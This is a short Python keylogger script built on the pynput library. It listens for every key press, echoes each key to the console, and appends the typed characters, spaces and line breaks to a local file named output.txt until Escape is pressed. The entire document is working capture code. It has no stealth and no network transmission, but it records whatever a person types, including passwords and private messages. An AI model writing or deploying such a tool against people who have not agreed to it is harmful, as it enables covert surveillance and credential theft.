from pynput.keyboard import Key, Listener  # importing the listener

count = 0
keys = []


def key_press(key):  # handler function for key press
    global keys, count
    keys.append(key)
    count += 1
    print("{0}".format(key))

    if count >= 0:
        count = 0
        file_write(keys)
        keys = []


def key_release(key):  # handler function to stop the program
    if key == Key.esc:
        return False


def file_write(keyz):  # function to write the code in an output file
    with open("output.txt", "a") as file:
        for key in keyz:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write(' ')
            elif k.find("Key") == -1:
                file.write(str(k))
            elif k.find("enter") > 0:
                file.write('\n')


with Listener(on_press=key_press, on_release=key_release) as listener:  # setting up the listener to listen to key
    listener.join()                                                     # strokes

